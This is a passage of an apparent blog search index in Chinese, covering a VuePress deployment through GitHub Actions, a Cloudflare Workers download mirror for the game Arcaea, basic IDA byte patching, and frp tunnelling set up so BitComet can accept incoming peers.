\u5173\u8054\u7684\u6b65\u9aa4\uff0c\u56e0\u4e3a\u4e0a\u4e00\u7bc7\u535a\u5ba2\u5df2\u7ecf\u8bf4\u7684\u5f88\u660e\u786e\u4e86\uff0c\u8fd9\u7bc7\u535a\u5ba2\u6211\u4eec\u76f4\u63a5\u4ece <code>yml</code> \u6587\u4ef6\u600e\u4e48\u5199\u5f00\u59cb\u8bf4\u8d77\u3002</p> <p>\u540c\u6837\u662f\u53bb\u627e\u5b98\u65b9\u6587\u6863\uff0c\u6ce8\u610f <code>1.x</code> \u548c <code>2.x</code> \u7684\u6587\u6863\u6709\u6240\u4e0d\u540c\u3002</p> 1.x2.x\uff08\u4ec5\u505a\u793a\u8303\uff0c\u4e0d\u6807\u6ce8\uff09 main.yml\uff08\u8bf7\u52ff\u76f4\u63a5\u4f7f\u7528\uff09<pre><code>name: Build and Deploy\non: [push]\njobs:\nbuild-and-deploy:\nruns-on: ubuntu-latest\nsteps:\n- name: Checkout\nuses: actions/checkout@master\n\n- name: vuepress-deploy\nuses: jenkey2011/vuepress-deploy@master\nenv:\nACCESS_TOKEN: ${{ secrets.ACCESS_TOKEN }}\nTARGET_REPO: username/repo\nTARGET_BRANCH: master\nBUILD_SCRIPT: yarn &amp;&amp; yarn build\nBUILD_DIR: docs/.vuepress/dist\nCNAME: https://www.xxx.com\n</code></pre> main.yml\uff08\u8bf7\u52ff\u76f4\u63a5\u4f7f\u7528\uff09<pre><code>name: docs\n\non:\n# \u6bcf\u5f53 push \u5230 main \u5206\u652f\u65f6\u89e6\u53d1\u90e8\u7f72\npush:\nbranches: [main]\n# \u624b\u52a8\u89e6\u53d1\u90e8\u7f72\nworkflow_dispatch:\n\njobs:\ndocs:\nruns-on: ubuntu-latest\n\nsteps:\n- uses: actions/checkout@v2\nwith:\n# \u201c\u6700\u8fd1\u66f4\u65b0\u65f6\u95f4\u201d \u7b49 git \u65e5\u5fd7\u76f8\u5173\u4fe1\u606f\uff0c\u9700\u8981\u62c9\u53d6\u5168\u90e8\u63d0\u4ea4\u8bb0\u5f55\nfetch-depth: 0\n\n- name: Setup Node.js\nuses: actions/setup-node@v1\nwith:\n# \u9009\u62e9\u8981\u4f7f\u7528\u7684 node \u7248\u672c\nnode-version: '14'\n\n# \u7f13\u5b58 node_modules\n- name: Cache dependencies\nuses: actions/cache@v2\nid: yarn-cache\nwith:\npath: |\n**/node_modules\nkey: ${{ runner.os }}-yarn-${{ hashFiles('**/yarn.lock') }}\nrestore-keys: |\n${{ runner.os }}-yarn-\n\n# \u5982\u679c\u7f13\u5b58\u6ca1\u6709\u547d\u4e2d\uff0c\u5b89\u88c5\u4f9d\u8d56\n- name: Install dependencies\nif: steps.yarn-cache.outputs.cache-hit != 'true'\nrun: yarn --frozen-lockfile\n\n# \u8fd0\u884c\u6784\u5efa\u811a\u672c\n- name: Build VuePress site\nrun: yarn docs:build\n\n# \u67e5\u770b workflow \u7684\u6587\u6863\u6765\u83b7\u53d6\u66f4\u591a\u4fe1\u606f\n# @see https://github.com/crazy-max/ghaction-github-pages\n- name: Deploy to GitHub Pages\nuses: crazy-max/ghaction-github-pages@v2\nwith:\n# \u90e8\u7f72\u5230 gh-pages \u5206\u652f\ntarget_branch: gh-pages\n# \u90e8\u7f72\u76ee\u5f55\u4e3a VuePress \u7684\u9ed8\u8ba4\u8f93\u51fa\u76ee\u5f55\nbuild_dir: docs/.vuepress/dist\nenv:\n# @see https://docs.github.com/cn/actions/reference/authentication-in-a-workflow#about-the-github_token-secret\nGITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n</code></pre> <p>\u6ce8\u610f\u6709\u5751</p> <p>\u4e0a\u9762\u6807\u6ce8\u7684\u5730\u65b9\uff0c\u770b\u5230\u6ca1\u6709\uff1f\u5168\u90fd\u662f\u5751\uff01 \u5c24\u5176\u662f\u7b2c15\u884c\u8fd9\u4e2a <code>TARGET_BRANCH: master</code>\uff0c\u7b80\u76f4\u662f\u4e00\u952e\u5220\u5e93\u8dd1\u8def\u7ea7\u522b\u7684\u5751\u3002</p> <p>\u9996\u5148\u8bf4\u4e0b15\u884c\u8fd9\u4e2a\u3002</p> <p><code>TARGET_BRANCH</code> \u7684\u610f\u601d\u662f\uff0c\u6307\u5b9a build \u51fa\u6765\u7684 HTML \u9875\u9762\u5b58\u653e\u7684\u5206\u652f\uff0c\u800c\u4e0d\u662f\u6307\u5b9a markdown \u6587\u4ef6\u5b58\u653e\u7684\u5206\u652f\u3002\u5f53\u521d\u5c31\u88ab\u8fd9\u4e2a\u4e1c\u897f\u5751\u4e86\uff0c\u4ee5\u4e3a\u662f\u4ece <code>TARGET_BRANCH</code> \u8fd9\u4e2a\u5206\u652f\u83b7\u53d6 markdown\uff0c\u6211\u5c31\u8bbe\u7f6e\u7684\u9ed8\u8ba4\u7684 <code>master</code>\uff0c\u7ed3\u679c\u4ed6\u628a\u751f\u6210\u7684 HTML \u5168\u90e8\u7ed9 rebase \u5230\u6211\u7684 <code>master</code> \u5206\u652f\u4e86\u3002\u597d\u4e86\uff0c\u6211\u5199\u7684 markdown \u88ab\u5168\u90e8\u8986\u76d6\u4e86\u3002</p> <p>\u6b63\u786e\u7684\u505a\u6cd5\u662f\uff1a<code>TARGET_BRANCH: gh-pages</code></p> <p>\u8fd9\u6837\u4ed6\u5c31\u4f1a\u628a\u751f\u6210\u7684 HTML \u5b58\u653e\u5230 <code>gh-pages</code> \u5206\u652f\uff0c\u8fd9\u4e5f\u662f\u5927\u591a\u6570\u81ea\u52a8\u5316 Pages \u5e94\u7528\uff08\u6bd4\u5982 <code>MkDocs</code>\uff09\u751f\u6210\u7684\u9875\u9762\u6240\u5728\u5206\u652f\u3002</p> <p>\u7136\u540e\u662f16\u884c\u8fd9\u4e2a <code>BUILD_SCRIPT: yarn &amp;&amp; yarn build</code>\u3002</p> <p>\u4f60\u8fd9\u548b build\uff1f</p> <p>\u6539\u6210\uff1a<code>BUILD_SCRIPT: yarn &amp;&amp; yarn docs:build</code></p> <p>\u7136\u540e\u662f18\u884c\u8fd9\u4e2a <code>CNAME</code>\uff0c\u8fd9\u4e2a\u5df2\u7ecf\u5728\u4e0a\u4e00\u7bc7\u535a\u5ba2\u91cc\u63d0\u5230\u4e86\uff0c\u5c31\u662f\u7528\u6765\u81ea\u52a8\u8bbe\u7f6e\u81ea\u5b9a\u4e49\u57df\u540d\u7684\uff0c\u8fd9\u91cc\u6539\u6210\u4f60\u60f3\u8981\u7684\u57df\u540d\u5c31\u53ef\u4ee5\u4e86\u3002\u6ca1\u4ec0\u4e48\u5927\u5751\u3002</p> <p>\u6700\u540e\u6539\u4e00\u4e0b <code>TARGET_REPO: username/repo</code>\uff0c\u6307\u5411\u4f60\u81ea\u5df1\u7684 repo\uff0c\u8fd9\u91cc\u4ee5\u6211\u7684 mokabot2 \u4e3a\u4f8b\u3002</p> <p>\u6700\u7ec8\u7684\u6210\u54c1\u5e94\u8be5\u662f\u8fd9\u6837\u7684\uff1a</p> main.yml<pre><code>name: Build and Deploy\non: [push]\njobs:\nbuild-and-deploy:\nruns-on: ubuntu-latest\nsteps:\n- name: Checkout\nuses: actions/checkout@master\n\n- name: vuepress-deploy\nuses: jenkey2011/vuepress-deploy@master\nenv:\nACCESS_TOKEN: ${{ secrets.ACCESS_TOKEN }}\nTARGET_REPO: MokaDevelopers/mokabot2\nTARGET_BRANCH: gh-pages\nBUILD_SCRIPT: yarn &amp;&amp; yarn docs:build\nBUILD_DIR: docs/.vuepress/dist\nCNAME: docs-mokabot.arisa.moe\n</code></pre> <p>\u4f46\u662f\u5148\u4e0d\u8981\u63d0\u4ea4\uff0c\u8bbe\u7f6e\u597d\u5bc6\u94a5\u4e4b\u540e\u518d\u63d0\u4ea4\uff0c\u8fd9\u4e2a\u5bc6\u94a5\u662f\u63d0\u4f9b\u7ed9 <code>vuepress-deploy</code> \u5e94\u7528\u6765\u4f7f\u7528\u7684\u3002</p>","tags":["github actions","github pages","vuepress"]},{"location":"blog/2022/220408-github-pages-2/#_2","title":"\u8bbe\u7f6e\u5bc6\u94a5","text":"<p>\u8fd9\u4e00\u6b65\u5fc5\u4e0d\u53ef\u5c11\uff0c\u4e0d\u7136\u5373\u4f7f Actions \u53ef\u4ee5\u751f\u6210\uff0c\u4f46\u662f <code>vuepress-deploy</code> \u6ca1\u6cd5\u90e8\u7f72\u5230\u4f60\u7684 <code>gh-pages</code> \u5206\u652f\u91cc\u3002</p> <p>\u770b\u8fd9\u4e2a \u6587\u6863 \u5c31\u884c\u3002</p> <p>\u8bbe\u7f6e\u597d\u5bc6\u94a5\u4e4b\u540e\u5c31\u53ef\u4ee5\u63d0\u4ea4\u90a3\u4e2a <code>yml</code> \u6587\u4ef6\u4e86\u3002</p>","tags":["github actions","github pages","vuepress"]},{"location":"blog/2022/220408-github-pages-2/#_3","title":"\u5b8c\u6210","text":"<p>\u8bbe\u7f6e\u5b8c\u8fd9\u4e9b\u4e4b\u540e\uff0c\u5c31\u53ef\u4ee5\u6b63\u5e38\u901a\u8fc7 <code>push</code> \u64cd\u4f5c\u89e6\u53d1 Actions \u6d41\u7a0b\u81ea\u52a8\u6784\u5efa\u6587\u6863\u4e86\u3002</p>","tags":["github actions","github pages","vuepress"]},{"location":"blog/2022/220409-cloudflare-workers-arcaea-update/","title":"\u5982\u4f55\u4f7f\u7528 Cloudflare Workers \u6765\u642d\u5efa Arcaea \u955c\u50cf\u4e0b\u8f7d\u670d\u52a1\u5668","text":"<p>\u8f6c\u8f7d\u81ea Arcaea-Infinity/dl.arcaea.moe \uff08\u90e8\u7f72\u6587\u6863\u90e8\u5206\u662f\u672c\u4eba\u5199\u7684\uff0c\u800c js \u811a\u672c\u7531 TheSnowfield \u63d0\u4f9b\uff09</p>","tags":["cloudflare","cloudflare-workers","arcaea"]},{"location":"blog/2022/220409-cloudflare-workers-arcaea-update/#_1","title":"\u7b80\u4ecb","text":"<p>\u8fd9\u662f\u4e00\u4e2a Arcaea \u955c\u50cf\u4e0b\u8f7d\u670d\u52a1\uff0c\u8be5\u670d\u52a1\u901a\u8fc7 Cloudflare Workers \u53cd\u5411\u4ee3\u7406\u5b9e\u73b0\uff0c\u672c\u8d28\u4e0a\u662f\u901a\u8fc7 Lowiro webapi \u83b7\u53d6\u6700\u65b0\u7684 APK \u6587\u4ef6 URL\uff0c\u7136\u540e\u901a\u8fc7\u8be5 URL \u4e0b\u8f7d\u6587\u4ef6\u3002</p> <p>\u76ee\u524d\u8be5\u670d\u52a1\u5df2\u7ecf\u642d\u5efa\u5728\u4e86\uff1a</p> <ul> <li>https://dl.arcaea.moe</li> <li>https://dl.lcwiro.com</li> </ul> <p>\u4f60\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e9b\u7f51\u5740\u968f\u65f6\u4e0b\u8f7d\u6700\u65b0\u7684 <code>arcaea_X.X.Xc.apk</code> \u6587\u4ef6\u3002</p>","tags":["cloudflare","cloudflare-workers","arcaea"]},{"location":"blog/2022/220409-cloudflare-workers-arcaea-update/#_2","title":"\u90e8\u7f72","text":"","tags":["cloudflare","cloudflare-workers","arcaea"]},{"location":"blog/2022/220409-cloudflare-workers-arcaea-update/#1-cloudflare-workers","title":"1. \u521b\u5efa\u4e00\u4e2a Cloudflare Workers \u5b9e\u4f8b","text":"<p>\u8fdb\u5165 Cloudflare \u63a7\u5236\u53f0\uff0c\u70b9\u51fb <code>Workers</code> \u6807\u7b7e\u9875\uff0c\u7136\u540e\u70b9\u51fb <code>Create a Service</code> \u6309\u94ae\u3002</p> <p></p> <p>\u9009\u62e9 <code>HTTP handler</code>\uff0c\u7136\u540e\u70b9\u51fb <code>Create service</code> \u6309\u94ae\u3002</p> <p></p> <p>\u6b64\u65f6\u4f60\u7684\u670d\u52a1\u5df2\u7ecf\u642d\u5efa\u597d\u4e86\uff0c\u4f60\u5e94\u8be5\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a\u7c7b\u4f3c\u4e8e <code>aaaaabbbbb.ccccc.workers.dev</code> \u7684 URL\uff0c\u8fd9\u5c31\u662f\u4f60\u7684 <code>Workers</code> \u5b9e\u4f8b\u7684 URL\u3002</p> <p>\u63d0\u793a</p> <p>\u4e00\u4e2a <code>Workers</code> \u5b9e\u4f8b\u4e5f\u53eb <code>\u670d\u52a1</code>\uff0c\u4e0b\u6587\u4e00\u5f8b\u7b80\u79f0 <code>\u670d\u52a1</code>\u3002</p>","tags":["cloudflare","cloudflare-workers","arcaea"]},{"location":"blog/2022/220409-cloudflare-workers-arcaea-update/#2","title":"2. \u8bbe\u7f6e\u8be5\u670d\u52a1","text":"<p>\u5728\u4e0a\u4e00\u6b65\u64cd\u4f5c\u7684\u540c\u4e00\u4e2a\u9875\u9762\u5185\uff0c\u9009\u62e9 <code>Resources</code> \u6807\u7b7e\uff0c\u7136\u540e\u70b9\u51fb <code>Quick edit</code> \u6309\u94ae\u3002</p> <p></p> <p>\u4ece\u6211\u4eec\u7684 Repo \u4e0b\u8f7d\u5230 index.js \u7684\u4ee3\u7801 \uff0c\u76f4\u63a5\u590d\u5236\u5168\u6587\uff0c\u7136\u540e\u7c98\u8d34\u5230\u5982\u4e0b\u533a\u57df\uff0c\u8bb0\u5f97\u662f\u5168\u6587\u8986\u76d6\u3002</p> <p></p> <p>\u7136\u540e\u70b9\u51fb <code>Save and Deploy</code> \u6309\u94ae\u3002</p> <p>\u6b64\u65f6\u4f60\u7684\u670d\u52a1\u5df2\u7ecf\u53ef\u4ee5\u6295\u5165\u4f7f\u7528\u4e86\u3002</p>","tags":["cloudflare","cloudflare-workers","arcaea"]},{"location":"blog/2022/220409-cloudflare-workers-arcaea-update/#3","title":"3. \u6d4b\u8bd5\u670d\u52a1\u53ef\u7528\u6027","text":"<p>\u6253\u5f00\u4f60\u7684\u6d4f\u89c8\u5668\uff0c\u8f93\u5165\u4f60\u7684\u670d\u52a1\u7684 URL\uff0c\u5982 <code>https://aaaaabbbbb.ccccc.workers.dev</code>\uff0c\u4f60\u7684\u6d4f\u89c8\u5668\u6b64\u65f6\u5e94\u8be5\u6b63\u786e\u5f00\u59cb\u4e0b\u8f7d\u6700\u65b0\u7248\u672c\u7684 Arcaea\u3002</p> <p>\u6ce8\u610f</p> <p>\u5982\u679c\u4f60\u53ea\u662f\u60f3\u90e8\u7f72\u5230 Cloudflare Workers\uff0c\u6b64\u65f6\u4f60\u9700\u8981\u505a\u7684\u4e8b\u60c5\u5df2\u7ecf\u505a\u5b8c\u4e86\u3002\u5982\u679c\u4f60\u60f3\u7ee7\u7eed\u5c06\u5176\u90e8\u7f72\u5230\u4f60\u7684\u81ea\u5b9a\u4e49\u57df\u540d\uff0c\u4f60\u9700\u8981\u7ee7\u7eed\u770b\u4e0b\u53bb\u3002</p>","tags":["cloudflare","cloudflare-workers","arcaea"]},{"location":"blog/2022/220409-cloudflare-workers-arcaea-update/#4-dns","title":"4. \u8bbe\u7f6e\u81ea\u5b9a\u4e49\u57df\u540d\u7684 DNS \u8bb0\u5f55","text":"<p>\u6253\u5f00\u4f60\u7684 DNS \u63a7\u5236\u53f0\uff0c\u6dfb\u52a0\u4e00\u4e2a <code>CNAME</code> \u8bb0\u5f55\u3002</p> <p></p> <p>\u6ce8\u610f\u4ee5\u4e0b\u503c\u7684\u586b\u5199\uff1a</p> \u5b57\u6bb5 \u503c \u5907\u6ce8 Type <code>CNAME</code> Name <code>dl</code> \u4f60\u60f3\u90e8\u7f72\u5230\u54ea\u4e2a\u5b50\u57df\u5c31\u4f7f\u7528\u54ea\u4e2a\u503c Target <code>aaaaabbbbb.ccccc.workers.dev</code> \u4f7f\u7528\u4f60\u670d\u52a1\u6240\u5728\u7684 URL Proxy status <code>Proxied</code> \u5fc5\u987b\u662f <code>Proxied</code> <p>\u7136\u540e\u70b9\u51fb <code>Save</code> \u6309\u94ae\u3002</p>","tags":["cloudflare","cloudflare-workers","arcaea"]},{"location":"blog/2022/220409-cloudflare-workers-arcaea-update/#5","title":"5. \u5c06\u4f60\u7684\u81ea\u5b9a\u4e49\u57df\u540d\u7684\u5b50\u57df\u8bbe\u7f6e\u4e3a\u8be5\u670d\u52a1\u7684\u8def\u7531:","text":"<p>\u5728\u63a7\u5236\u53f0\u4e2d\u8fdb\u5165 <code>Workers</code> \u6807\u7b7e\u9875\u7136\u540e\u70b9\u51fb <code>Add route</code> \u6309\u94ae\u3002</p> <p>\u6ce8\u610f</p> <p>\u8fd9\u91cc\u7684 <code>Workers</code> \u6807\u7b7e\u9875\u4e0d\u662f Cloudflare \u4e3b\u9875\u7684\u90a3\u4e2a\u6807\u7b7e\u9875\uff0c\u800c\u662f\u4f60\u70b9\u51fb\u4f60\u7684\u57df\u540d\u4e4b\u540e\u51fa\u73b0\u7684 <code>Workers</code> \u6807\u7b7e\u9875\u3002</p> <p></p> <p>\u6ce8\u610f\u4ee5\u4e0b\u503c\u7684\u586b\u5199\uff1a</p> \u5b57\u6bb5 \u503c \u5907\u6ce8 Route <code>dl.example.com/*</code> \u5fc5\u987b\u662f <code>\u4f60\u7684\u5b50\u57df</code> + <code>/*</code> Service <code>aaaaabbbbb</code> \u4f7f\u7528\u4f60\u7684\u670d\u52a1\u7684\u540d\u5b57 <p>\u7136\u540e\u70b9\u51fb <code>Save</code> \u6309\u94ae\u3002</p>","tags":["cloudflare","cloudflare-workers","arcaea"]},{"location":"blog/2022/220409-cloudflare-workers-arcaea-update/#6","title":"6. \u6d4b\u8bd5\u7684\u4f60\u7684\u5b50\u57df","text":"<p>\u73b0\u5728\u6253\u5f00\u4f60\u7684\u6d4f\u89c8\u5668\uff0c\u8f93\u5165\u4f60\u7684\u5b50\u57df\uff0c\u5982 <code>https://dl.example.com/</code> \uff0c\u4f60\u7684\u6d4f\u89c8\u5668\u6b64\u65f6\u5e94\u8be5\u6b63\u786e\u5f00\u59cb\u4e0b\u8f7d\u6700\u65b0\u7248\u672c\u7684 Arcaea\u3002\uff0c</p>","tags":["cloudflare","cloudflare-workers","arcaea"]},{"location":"blog/2022/220409-cloudflare-workers-arcaea-update/#_3","title":"\u8bb8\u53ef\u8bc1","text":"<p>\u672c\u6587\u6863\u9075\u5faa\u4ee5\u4e0b\u8bb8\u53ef\u8bc1\uff1a<code>616 SB License</code></p>","tags":["cloudflare","cloudflare-workers","arcaea"]},{"location":"blog/2022/220412-ida-substitute-usage/","title":"IDA \u66ff\u6362\u4e8c\u8fdb\u5236\u6587\u4ef6","text":"<p>\u6700\u8fd1\u5728\u4fee\u6539\u67d0\u4e2a\ud83c\uddec\ud83c\udde7\u6e38\u620f\uff0c\u6d89\u53ca\u5230\u4e00\u4e9b IDA \u5728\u66ff\u6362\u65b9\u9762\u7684\u4f7f\u7528\uff0c\u8fd9\u91cc\u8bb0\u5f55\u4e00\u4e0b\uff0c\u514d\u5f97\u6bcf\u6b21\u90fd\u53bb\u9ebb\u70e6\u7fa4\u53cb\u95ee IDA \u600e\u4e48\u7528\u3002</p>","tags":["ida"]},{"location":"blog/2022/220412-ida-substitute-usage/#_1","title":"\u6587\u672c\u641c\u7d22","text":"<pre><code>graph LR\n  A[Search] --&gt; B[text];</code></pre> <p>\u8f93\u5165\u60f3\u8981\u641c\u7d22\u7684\u6587\u672c\u5373\u53ef\u3002</p>","tags":["ida"]},{"location":"blog/2022/220412-ida-substitute-usage/#_2","title":"\u641c\u7d22\u5b57\u8282\uff08\u5341\u516d\u8fdb\u5236\u3001\u5341\u8fdb\u5236\u548c\u516b\u8fdb\u5236\uff09","text":"<pre><code>graph LR\n  A[Search] --&gt; B[sequence of bytes];</code></pre> <p>\u7136\u540e\u9009\u62e9 <code>Hex</code>\u3001<code>Decimal</code> \u6216 <code>Octal</code>\uff0c\u8f93\u5165\u4f60\u9700\u8981\u641c\u7d22\u7684\u5b57\u8282\uff0c\u6bcf\u4e2a\u5b57\u8282\u4f7f\u7528\u7a7a\u683c\u5206\u9694\u3002</p>","tags":["ida"]},{"location":"blog/2022/220412-ida-substitute-usage/#hex","title":"Hex \u66ff\u6362","text":"<p>\u9996\u5148\u5728 <code>IDA View</code> \u9009\u9879\u5361\u4e2d\u9009\u62e9\u5230\u4f60\u60f3\u8981\u66ff\u6362\u7684\u5185\u5bb9\u6240\u5728\u7684\u5b57\u8282\uff08\u4ee5\u5b57\u7b26\u4e32\u4e3a\u4f8b\uff09\uff0c\u7136\u540e\u5207\u6362\u5230 <code>Hex View</code> \u9009\u9879\u5361\uff08\u5341\u516d\u8fdb\u5236\u7f16\u8f91\u5668\uff09\u3002\u9009\u62e9\u4e00\u4e2a\u5b57\u8282\uff0c\u4f60\u63a5\u4e0b\u6765\u8981\u4f1a\u4ece\u8fd9\u91cc\u5f00\u59cb\u7f16\u8f91\u3002</p> <p>\u5982\u679c\u6ca1\u6709\u8fd9\u4e2a\u9009\u9879\u5361</p> <pre><code>graph LR\n  A[View] --&gt; B;\n  B[Open subviews] --&gt; C[Hex dump];</code></pre> <p>\u4ece\u8fd9\u91cc\u6253\u5f00 <code>Hex View</code> \u9009\u9879\u5361\u3002</p> <p>\u6709\u4e24\u79cd\u65b9\u5f0f\u53ef\u4ee5\u7f16\u8f91\uff1a</p> <ol> <li> <p>\u5728\u5341\u516d\u8fdb\u5236\u7f16\u8f91\u5668\u4e2d\u53f3\u952e\u9009\u62e9 <code>Edit</code>\uff08\u6216\u8005\u6309 F2\uff09\uff0c\u7136\u540e\u76f4\u63a5\u7f16\u8f91\u5341\u516d\u8fdb\u5236\u6216\u8005\u76f4\u63a5\u7f16\u8f91\u6587\u672c\u5185\u5bb9\uff0c\u7f16\u8f91\u5b8c\u6210\u540e\u53f3\u952e\u9009\u62e9 <code>Apply Changes</code>\uff08\u6216\u8005\u6309 F2\uff09\u3002</p> </li> <li> <p>\u9009\u62e9 <code>Edit</code> -&gt; <code>Patch Program</code> -&gt; <code>Change Byte..</code>\uff0c\u5728\u5f39\u51fa\u7684\u5bf9\u8bdd\u6846\u4e2d\u5bf9\u5e94\u586b\u5199\u4f60\u8981\u66ff\u6362\u7684\u5341\u516d\u8fdb\u5236\u503c\uff08\u4e00\u6b21\u6027\u66ff\u636216\u4e2a\u5b57\u8282\uff09\uff0c\u7136\u540e\u70b9 <code>OK</code>\u3002</p> </li> </ol>","tags":["ida"]},{"location":"blog/2022/220412-ida-substitute-usage/#_3","title":"\u641c\u7d22\u5b57\u7b26\u4e32","text":"<pre><code>graph LR\n  A[View] --&gt; B;\n  B[Open subviews] --&gt; C[Strings];</code></pre> <p>\u5728\u51fa\u6765\u7684\u5b57\u7b26\u4e32\u5217\u8868\u4e2d\u76f4\u63a5\u4f7f\u7528 Ctrl+F \u641c\u7d22\u5373\u53ef\u3002</p>","tags":["ida"]},{"location":"blog/2022/220412-ida-substitute-usage/#_4","title":"\u751f\u6210\u4f2a\u4ee3\u7801","text":"<p>\u5728 <code>IDA View</code> \u9009\u9879\u5361\u4e2d\u9009\u62e9\u5230\u4f60\u751f\u6210\u7684\u51fd\u6570\uff0c\u6309 F5 \u751f\u6210\u4f2a\u4ee3\u7801\u3002</p>","tags":["ida"]},{"location":"blog/2022/220412-ida-substitute-usage/#_5","title":"\u4fdd\u5b58\u4e8c\u8fdb\u5236\u6587\u4ef6","text":"<p><pre><code>graph LR\n  A[Edit] --&gt; B;\n  B[Patch Program] --&gt; C[Apply patches to input file..];</code></pre> \u4ece\u8fd9\u91cc\u4fdd\u5b58\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002</p>","tags":["ida"]},{"location":"blog/2022/220413-Intranet-penetration-bitcomit/","title":"\u5229\u7528\u5185\u7f51\u7a7f\u900f\u548c\u4ee3\u7406\u83b7\u53d6\u516c\u7f51 IP \u5730\u5740\u89e3\u51b3\u6bd4\u7279\u5f57\u661f\u9ec4\u706f","text":"","tags":["frp","bitcomit","proxy"]},{"location":"blog/2022/220413-Intranet-penetration-bitcomit/#_1","title":"\u80cc\u666f","text":"<p>\u60f3\u7528\u6bd4\u7279\u5f57\u661f\u4e0b\u79cd\u5b50\uff0c\u4f46\u662f\u56e0\u4e3a\u8eab\u5904\u6570\u4e2a NAT \u8eab\u540e\uff0c\u6839\u672c\u6ca1\u6709\u516c\u7f51 IP\uff0c\u5bfc\u81f4\u65e0\u6cd5\u8ba9\u522b\u7684 peer \u8fde\u63a5\u5230\u4f60\uff0c\u4e0b\u8f7d\u901f\u5ea6\u582a\u5fe7\u3002</p> <p>\u6ca1\u6709\u516c\u7f51 IP \u600e\u4e48\u529e\uff1f\u6253\u7535\u8bdd\u95ee\u8fd0\u8425\u5546\uff1f\u8fd8\u662f\u7b97\u4e86\u5427\uff0c\u5e72\u8106\u5411\u81ea\u5df1 VPS \u501f\u4e00\u4e2a\u3002</p>","tags":["frp","bitcomit","proxy"]},{"location":"blog/2022/220413-Intranet-penetration-bitcomit/#_2","title":"\u524d\u63d0\u6761\u4ef6","text":"<ul> <li>\u4e00\u53f0\u6709\u516c\u7f51 IP \u7684\u673a\u5668\uff08\u6700\u597d\u662f\u56fa\u5b9a\u7684 IP\uff09</li> <li>\u8fd9\u53f0\u673a\u5668\u88ab\u5141\u8bb8\u642d\u5efa frp \u7b49\u5185\u7f51\u7a7f\u900f\u670d\u52a1</li> <li>\u8fd9\u53f0\u673a\u5668\u88ab\u5141\u8bb8\u642d\u5efa\u4ee3\u7406\u670d\u52a1</li> </ul>","tags":["frp","bitcomit","proxy"]},{"location":"blog/2022/220413-Intranet-penetration-bitcomit/#_3","title":"\u64cd\u4f5c","text":"","tags":["frp","bitcomit","proxy"]},{"location":"blog/2022/220413-Intranet-penetration-bitcomit/#frps","title":"\u90e8\u7f72 frps","text":"<p>\u9996\u5148\u5728\u6709\u516c\u7f51 IP \u7684\u90a3\u53f0\u673a\u5668\u4e0a\u90e8\u7f72 frp \u670d\u52a1\u7aef\u3002</p> <p>\u53bb release \u4e0b\u8f7d\u5bf9\u5e94\u7cfb\u7edf\u7684 frp\uff0c\u4e0b\u8f7d\u4e4b\u540e\u89e3\u538b\uff0c\u91cc\u9762\u7684 frps \u5c31\u662f\u6211\u4eec\u9700\u8981\u7684 frp \u670d\u52a1\u7aef\u3002</p> <p>\u5199 <code>frps.ini</code>\uff1a</p> frps.ini<pre><code>[common]\nbind_port = 7000\nbind_udp_port = 7000\nbind_addr = 0.0.0.0\nallow_ports = 1001-1500,10001-22500\ntoken = \u4f60\u7684\u5bc6\u7801\ntls_only = true\n</code></pre> <p>\u6ce8\u610f\u4ee5\u4e0b\u914d\u7f6e\u9879\uff1a</p> <ul> <li><code>allow_ports</code> \u662f\u6307\u7ecf\u8fc7 frp \u4ee3\u7406/\u8f6c\u53d1\u7684\u8fde\u63a5\u53ef\u4ee5\u4f7f\u7528\u7684\u7aef\u53e3\u8303\u56f4\u3002</li> <li><code>token</code> \u8bf7\u81ea\u5df1\u968f\u4fbf\u8bbe\u7f6e\u4e00\u4e2a\u3002</li> <li><code>tls_only</code> \u5219\u8981\u6c42\u6240\u6709\u7684 frpc \u5ba2\u6237\u7aef\uff08\u662f\u4f60\uff0c\u4e0d\u662f\u6307\u90a3\u4e9b peers\uff09\u4e5f\u542f\u7528 TLS \u624d\u80fd\u8fde\u63a5\u3002\u5efa\u8bae\u8bbe\u7f6e\u6210 <code>true</code>\u3002</li> </ul> <p>\u5176\u4ed6\u7684\u53c2\u6570\u53ef\u4ee5\u901a\u8fc7 \u5b98\u7f51\u6587\u6863 \u67e5\u770b\u3002</p> <p>\u7136\u540e\u901a\u8fc7</p> <pre><code>frps.exe -c frps.ini\n</code></pre> <p>\u542f\u7528 frps \u670d\u52a1\u7aef\u3002</p> <p>\u6b64\u65f6\u4f60\u7684\u670d\u52a1\u7aef\u4e0a\u5e94\u8be5\u663e\u793a\u5982\u4e0b\u65e5\u5fd7\uff1a</p> <pre><code>2022/04/13 09:42:18 [I] [root.go:200] frps uses config file: frps.ini\n2022/04/13 09:42:18 [I] [service.go:192] frps tcp listen on 0.0.0.0:7000\n2022/04/13 09:42:18 [I] [service.go:276] nat hole udp service listen on 0.0.0.0:7000\n2022/04/13 09:42:18 [I] [root.go:209] frps started successfully\n</code></pre> <p>\u8bf4\u660e\u4f60\u7684\u670d\u52a1\u7aef\u6b63\u5728\u76d1\u542c\u6240\u6709\u6765\u81ea <code>7000</code> \u7aef\u53e3\u7684 frp \u8fde\u63a5\u3002</p>","tags":["frp","bitcomit","proxy"]},{"location":"blog/2022/220413-Intranet-penetration-bitcomit/#frpc","title":"\u90e8\u7f72 frpc","text":"<p>\u5728\u81ea\u5df1\u9700\u8981\u8fd0\u884c\u6bd4\u7279\u5f57\u661f\u7684\u7535\u8111\u4e0a\u90e8\u7f72 frp \u5ba2\u6237\u7aef\u3002</p> <p>\u540c\u6837\uff0c\u53bb\u4e0b\u8f7d\u5bf9\u5e94\u7cfb\u7edf\u7248\u672c\u7684 frp\uff0c\u89e3\u538b\u83b7\u53d6 frpc\u3002</p> <p>\u5199 <code>frpc.ini</code>\uff1a</p> frpc.ini<pre><code>[common]\nserver_addr = \u7ed9\u5b9a\u7684IPv4\u5730\u5740/IPv6\u5730\u5740/\u57df\u540d\nserver_port = 7000\nprotocol = websocket\ntoken = \u4f60\u7684\u5bc6\u7801\ntls_enable = true\n\n[Remote Download]\ntype = tcp\nlocal_ip = 127.0.0.1\nlocal_port = 2333\nremote_port = 2333\n\n[BT Listen TCP]\ntype = tcp\nlocal_ip = 127.0.0.1\nlocal_port = 10400\nremote_port = 10400\n\n[BT Listen UDP]\ntype = udp\nlocal_ip = 127.0.0.1\nlocal_port = 10400\nremote_port = 10400\n\n[eMule Listen TCP]\ntype = tcp\nlocal_ip = 127.0.0.1\nlocal_port = 22224\nremote_port = 22224\n\n[eMule Listen 